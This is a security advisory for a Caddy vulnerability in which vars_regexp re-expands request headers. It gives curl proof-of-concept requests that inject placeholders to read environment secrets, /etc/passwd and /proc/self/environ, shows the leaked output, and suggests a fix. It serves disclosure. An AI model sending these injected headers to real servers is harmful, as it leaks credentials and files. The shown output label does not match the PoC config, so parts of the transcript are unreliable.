# [M] Caddy's vars_regexp double-expands user input, leaking env vars and files

## Summary
Severity: Medium
Advisory: GHSA-m2w3-8f23-hxxf
CVE: CVE-2026-30852
CWE: CWE-200, CWE-74
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-06
Source: https://github.com/advisories/GHSA-m2w3-8f23-hxxf
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2/modules/caddyhttp` — affected >=2.7.5 <2.11.2

## Details
### Summary

The `vars_regexp` matcher in `vars.go:337` double-expands user-controlled input through the Caddy replacer. When `vars_regexp` matches against a placeholder like `{http.request.header.X-Input}`, the header value gets resolved once (expected), then passed through `repl.ReplaceAll()` again (the bug). This means an attacker can put `{env.DATABASE_URL}` or `{file./etc/passwd}` in a request header and the server will evaluate it, leaking environment variables, file contents, and system info.

`header_regexp` does NOT do this — it passes header values straight to `Match()`. So this is a code-level inconsistency, not intended behavior.

### Details

The bug is at `modules/caddyhttp/vars.go`, line 337 in `MatchVarsRE.MatchWithError()`:

```go
valExpanded := repl.ReplaceAll(varStr, "")
if match := val.Match(valExpanded, repl); match {
```

When the key is a placeholder like `{http.request.header.X-Input}`, `repl.Get()` resolves it to the raw header value (first expansion, line 318). Then `repl.ReplaceAll()` runs on that value again (second expansion, line 337), which evaluates any `{env.*}`, `{file.*}`, `{system.*}` placeholders the user put in there.

For comparison, `header_regexp` (`matchers.go:1129`) and `path_regexp` (`matchers.go:703`) both pass values directly to `Match()` without this second expansion.

This `repl.ReplaceAll()` was added by PR #5408 to fix #5406 (vars_regexp not working with placeholder keys). The fix was needed for resolving the key, but it also re-expands the resolved value, which is the bug.


*Side-by-side proof that this is a code bug, not misconfiguration — same header, same regex, different behavior:**

Config with both matchers on the same server:
```json
{
  "admin": {"disabled": true},
  "apps": {
    "http": {
      "servers": {
        "srv0": {
          "listen": [":8080"],
          "routes": [
            {
              "match": [{"path": ["/header_regexp"], "header_regexp": {"X-Input": {"name": "hdr", "pattern": ".+"}}}],
              "handle": [{"handler": "static_response", "body": "header_regexp: {http.regexp.hdr.0}"}]
            },
            {
              "match": [{"path": ["/vars_regexp"], "vars_regexp": {"{http.request.header.X-Input}": {"name": "var", "pattern": ".+"}}}],
              "handle": [{"handler": "static_response", "body": "vars_regexp: {http.regexp.var.0}"}]
            }
          ]
        }
      }
    }
  }
}
```

```
$ export SECRET=supersecretvalue123

$ curl -H 'X-Input: {env.HOME}' http://127.0.0.1:8080/header_regexp
header_regexp: {env.HOME}                           # literal string, safe

$ curl -H 'X-Input: {env.HOME}' http://127.0.0.1:8080/vars_regexp
vars_regexp: /Users/test                           # expanded — env var leaked

$ curl -H 'X-Input: {env.SECRET}' http://127.0.0.1:8080/header_regexp
header_regexp: {env.SECRET}                         # literal string, safe

$ curl -H 'X-Input: {env.SECRET}' http://127.0.0.1:8080/vars_regexp
vars_regexp: supersecretvalue123                    # secret leaked

$ curl -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080/header_regexp
header_regexp: {file./etc/hosts}                    # literal string, safe

$ curl -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080/vars_regexp
vars_regexp: ##                                     # file contents leaked
```

### PoC

Save this as `config.json`:
```json
{
  "admin": {"disabled": true},
  "apps": {
    "http": {
      "servers": {
        "srv0": {
          "listen": [":8080"],
          "routes": [
            {
              "match": [
                {
                  "vars_regexp": {
                    "{http.request.header.X-Input}": {
                      "name": "leak",
                      "pattern": ".+"
                    }
                  }
                }
              ],
              "handle": [
                {
                  "handler": "static_response",
                  "body": "Result: {http.regexp.leak.0}"
                }
              ]
            },
            {
              "handle": [
                {
                  "handler": "static_response",
                  "body": "No match",
                  "status_code": "200"
                }
              ]
            }
          ]
        }
      }
    }
  }
}
```

Start Caddy:
```bash
export SECRET_API_KEY=sk-PRODUCTION-abcdef123456
caddy run --config config.json
```

Requests and output:

```
$ curl -v -H 'X-Input: hello' http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.7.1
> Accept: */*
> X-Input: hello
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Wed, 18 Feb 2026 23:15:45 GMT
< Content-Length: 13
<
Leaked: hello
```

```
$ curl -v -H 'X-Input: {env.HOME}' http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.7.1
> Accept: */*
> X-Input: {env.HOME}
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Wed, 18 Feb 2026 23:15:45 GMT
< Content-Length: 20
<
Leaked: /Users/test
```

```
$ curl -v -H 'X-Input: {env.SECRET_API_KEY}' http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.7.1
> Accept: */*
> X-Input: {env.SECRET_API_KEY}
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Wed, 18 Feb 2026 23:15:45 GMT
< Content-Length: 34
<
Leaked: sk-PRODUCTION-abcdef123456
```

```
$ curl -v -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.7.1
> Accept: */*
> X-Input: {file./etc/hosts}
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Wed, 18 Feb 2026 23:15:45 GMT
< Content-Length: 10
<
Leaked: ##
```

Also works with `{system.hostname}`, `{system.os}`, `{env.PATH}`, etc.

Debug log (server starts clean, no errors):
```
{"level":"info","ts":1771456228.917303,"msg":"maxprocs: Leaving GOMAXPROCS=16: CPU quota undefined"}
{"level":"info","ts":1771456228.917334,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15461882265,"previous":9223372036854775807}
{"level":"info","ts":1771456228.9173398,"msg":"using config from file","file":"config.json"}
{"level":"warn","ts":1771456228.917349,"logger":"admin","msg":"admin endpoint disabled"}
{"level":"info","ts":1771456228.917928,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x340775faa300"}
{"level":"warn","ts":1771456228.920725,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"warn","ts":1771456228.920738,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"info","ts":1771456228.920741,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"info","ts":1771456228.9210382,"msg":"autosaved config (load with --resume flag)"}
{"level":"info","ts":1771456228.921052,"msg":"serving initial configuration"}
```

### Impact

Information disclosure. An attacker can leak:
- Environment variables (`{env.DATABASE_URL}`, `{env.AWS_SECRET_ACCESS_KEY}`, etc.)
- File contents up to 1MB (`{file./etc/passwd}`, `{file./proc/self/environ}`)
- System info (`{system.hostname}`, `{system.os}`, `{system.wd}`)

Requires a config where `vars_regexp` matches user-controlled input and the capture group is reflected back. The bug was introduced by PR #5408 (fix for #5406), affecting all versions since.

Suggested one-line fix:
```diff
--- a/modules/caddyhttp/vars.go
+++ b/modules/caddyhttp/vars.go
@@ -334,7 +334,7 @@
 			varStr = fmt.Sprintf("%v", vv)
 		}

-		valExpanded := repl.ReplaceAll(varStr, "")
+		valExpanded := varStr
 		if match := val.Match(valExpanded, repl); match {
 			return match, nil
 		}
```

This makes `vars_regexp` consistent with `header_regexp` and `path_regexp`. Placeholder key resolution (lines 315-318) is unaffected.

Tested on latest main commit at `95941a71` (2026-02-17).

**AI Disclosure:** Used Claude (Anthropic) during code review and testing. All findings verified manually.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-m2w3-8f23-hxxf
- https://nvd.nist.gov/vuln/detail/CVE-2026-30852
- https://github.com/caddyserver/caddy/pull/5408
- https://github.com/caddyserver/caddy
- https://github.com/caddyserver/caddy/releases/tag/v2.11.2
